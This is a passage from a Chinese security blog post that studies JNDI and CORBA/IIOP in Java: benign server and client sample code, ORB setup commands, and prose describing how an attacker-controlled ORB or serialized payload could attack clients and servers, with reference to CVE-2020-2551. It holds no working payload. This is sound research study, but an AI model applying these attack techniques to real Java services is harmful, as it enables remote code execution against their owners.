+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//实例化Hello servant</span></span><br><span class="line">    HelloImpl helloRef = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">    <span class="comment">//使用JNDI在命名服务中发布引用</span></span><br><span class="line">    Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL, <span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line">    InitialContext initialContext = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    initialContext.rebind(<span class="string">"HelloService"</span>, helloRef);</span><br><span class="line">    System.out.println(<span class="string">"Hello Server Ready..."</span>);</span><br><span class="line">    Thread.currentThread().join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Client端也和RMI差不多，只是多了一步CORBA的narrow进行类的转换</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    env.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>);</span><br><span class="line">    env.put(<span class="string">"java.naming.provider.url"</span>, <span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line">    Context ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    <span class="comment">// STEP 1: Get the Object reference from the Name Service</span></span><br><span class="line">    <span class="comment">// using JNDI call.</span></span><br><span class="line">    Object objref = ic.lookup(<span class="string">"HelloService"</span>);</span><br><span class="line">    System.out.println(<span class="string">"Client: Obtained a ref. to Hello server."</span>);</span><br><span class="line">    <span class="comment">// STEP 2: Narrow the object reference to the concrete type and</span></span><br><span class="line">    <span class="comment">// invoke the method.</span></span><br><span class="line">    HelloInterface hi = (HelloInterface) PortableRemoteObject.narrow(objref, HelloInterface<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    hi.sayHello(<span class="string">" MARS "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于CORBA的原因，还需要一些额外操作程序才能正常运行</p>
+<p>生成Stub和Skeletion</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmic -iiop HelloImpl</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200328213743.png" alt></p>
+<p>Stub和Skeletion的关系借用一张0c0c0f师傅的图片，可以理解为java程序与CORBA中间的一个代理数据层。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200331005932.png" alt></p>
+<p>启动ORB（orb的地址也就是命名服务的地址）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="攻击client-2"><a href="#攻击client-2" class="headerlink" title="攻击client"></a>攻击client</h3><p>我也不知道为什么目前为止只有rmi和ldap的利用，没有iiop的。</p>
+<p>由于具体不是特别了解，不知道怎么创建一个命名引用对象。可以来看下白皮书中提到的方法，但是没有具体示例。</p>
+<blockquote>
+<p>InitialContext supports three CORBA related schemes:</p>
+<ul>
+<li><p>iiop (com.sun.jndi.url.iiop.iiopURLContext) Eg: iiop://server/foo</p>
+</li>
+<li><p>corbaname (com.sun.jndi.url.corbaname.corbanameURLContext) Eg: corbaname:iiop:server#foo</p>
+</li>
+<li><p>iiopname (com.sun.jndi.url.iiopname.iiopnameURLContext)  Eg: iiopname://server/foo</p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>  Any of them can be used to fetch a reference from an ORB to perform the lookup operation. If an<br>  attacker can control the URL and point the lookup to an ORB under his control, he will be able to<br>  return a malicious Interoperable Object Reference (IOR).<br>  An IOR is a data structure providing information on the type, </p>
+</blockquote>
+<p>大致意思是说通过控制ORB，然后在我们恶意ORB中心返回一个由我们控制的IOR，从而实现客户端的attack。</p>
+<blockquote>
+<p>In Figure 4, an attacker can manually craft an IOR that specifies a codebase location (1) and an IDL Interface (2) under his control where the stub factory can be located. It can then place a stub factory class that runs the payload in its constructor and get the stub instantiated in the target server (3), successfully running his payload. </p>
+</blockquote>
+<p>议题中描述的攻击过程如下。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/1585642951.jpg" alt></p>
+<h3 id="攻击server-2"><a href="#攻击server-2" class="headerlink" title="攻击server"></a>攻击server</h3><p>仿照之前的方式，假如参数有Object的情况，当尝试传输一个序列化Payload时，是可以触发漏洞的</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200331005515.png" alt></p>
+<p>那试着往server端bind一个恶意的序列化对象呢？可以看到抛出了异常<code>java.rmi.NoSuchObjectException: object not exported</code></p>
+<p>猜测原因是之前生成的<code>_HelloImpl_Tie.class</code>的原因，导致CORBA服务没有对应的Stub类可以进行传输</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200331005641.png" alt></p>
+<h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h2 id="INITIAL-CONTEXT-FACTORY-做了些什么？"><a href="#INITIAL-CONTEXT-FACTORY-做了些什么？" class="headerlink" title="INITIAL_CONTEXT_FACTORY 做了些什么？"></a>INITIAL_CONTEXT_FACTORY 做了些什么？</h2><p>传入的值明显可以看到是一个类名，那我们找到这个类就可以看到，是一个实现了<code>InitialContextFactory</code>的工厂类，网上的介绍说主要是提供了上下文环境。</p>
+<p>可以看到其实主要就实现了<code>getInitialContext</code>接口，返回一个Context</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200401141155.png" alt></p>
+<p>这个Context也就是我们初始化 <code>InitialContext</code>之后返回的Context。里面定义了如何<code>lookup</code>、<code>bind</code>的具体操作，也就约定了两端通信的具体方法。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200401141336.png" alt></p>
+<p>这也就是为什么CVE-2020-2551的IIOP漏洞中的INITIAL_CONTEXT_FACTORY值是<code>weblogic.jndi.WLInitialContextFactory</code>。</p>
+<p>它返回的是一个<code>weblogic.corba.j2ee.naming.ContextImpl</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200401141707.png" alt></p>
+<p>服务端也就是在这里面bind时调用到了readObject方法。</p>
+<h2 id="为什么InitialContext可以不用初始化"><a href="#为什么InitialContext可以不用初始化" class="headerlink" title="为什么InitialContext可以不用初始化"></a>为什么InitialContext可以不用初始化</h2><p>如果不提供初始化参数，也就是不入HashTable，发现也是可以lookup到对应的iiop、rmi、ldap之类的服务的。</p>
+<p>因为这几个协议<code>InitialContext</code>默认是会自动根据协议名去找对应的工厂类</p>
+<p><code>javax.naming.spi.NamingManager.getURLObject()</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200401142139.png" alt></p>
+<p>具体有如下工厂方法</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/1585722200.jpg" alt></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>一开始想尽可能弄清其中细节，越到后面发现坑越挖越大，能力有限，目前就先弄清一些感兴趣的细节吧，还有很多未求甚解的东西。 一部分内容纯属个人理解，请辩证看待。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a> </p>
+<p> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
+<p> <a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/" target="_blank" rel="noopener">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a>  </p>
+<p> <a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a> </p>
+<p> <a href="https://paper.seebug.org/1105/" target="_blank" rel="noopener">https://paper.seebug.org/1105/</a> </p>
+<p> <a href="https://xz.aliyun.com/t/7422" target="_blank" rel="noopener">https://xz.aliyun.com/t/7422</a> </p>
+<p> <a href="https://y4er.com/post/attack-java-jndi-rmi-jrmp-1/" target="_blank" rel="noopener">https://y4er.com/post/attack-java-jndi-rmi-jrmp-1/</a> </p>
+<p> <a href="https://stackoverflow.com/questions/3918083/what-exactly-is-a-context-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/3918083/what-exactly-is-a-context-in-java</a> </p>
+<p> <a href="https://lucifaer.com/2020/02/20/Java CORBA研究/" target="_blank" rel="noopener">https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/</a> </p>
+<p> <a href="https://www.anquanke.com/post/id/200860" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200860</a> </p>
+<p> <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a> </p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2020/06/浅谈下Fastjson的autotype绕过/" data-toggle="tooltip" data-placement="top" title="浅谈下Fastjson的autotype绕过">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2020/03/Kubernetes基本概念和一些未授权访问/" data-toggle="tooltip" data-placement="top" title="Kubernetes基本概念和一些未授权访问">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#JNDI" title="JNDI">JNDI</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
